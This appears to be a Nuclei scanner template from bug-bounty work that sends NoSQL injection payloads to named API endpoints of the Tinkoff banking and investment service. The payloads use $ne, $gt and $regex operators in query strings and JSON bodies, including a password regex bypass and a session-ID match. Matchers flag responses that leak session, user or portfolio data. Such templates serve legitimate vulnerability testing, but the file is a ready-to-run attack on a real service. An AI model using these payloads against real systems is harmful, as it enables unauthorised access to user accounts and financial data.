id: tinkoff-nosql-injection

info:
  name: Tinkoff - NoSQL Injection
  author: bugbounty
  severity: critical
  description: NoSQL injection in API parameters
  tags: nosql,injection,tinkoff

http:
  - raw:
      - |
        GET /api/common/v1/session_info?platform[$ne]=null&sessionid=test HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /api/common/v1/session_info HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"platform":{"$ne":null},"sessionid":"test"}

      - |
        POST /api/invest-gw/social/v1/post HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"id":{"$gt":""},"content":"test"}

      - |
        GET /api/invest/portfolio/instruments/v2?tickers[$regex]=.* HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /api/common/v1/mobile_info HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"platform":"android","sessionid":{"$ne":""},"password":{"$regex":".*"}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        part: body
        words:
          - "session"
          - "user"
          - "data"
          - "portfolio"
        condition: or

      - type: word
        part: content_type
        words:
          - "application/json"
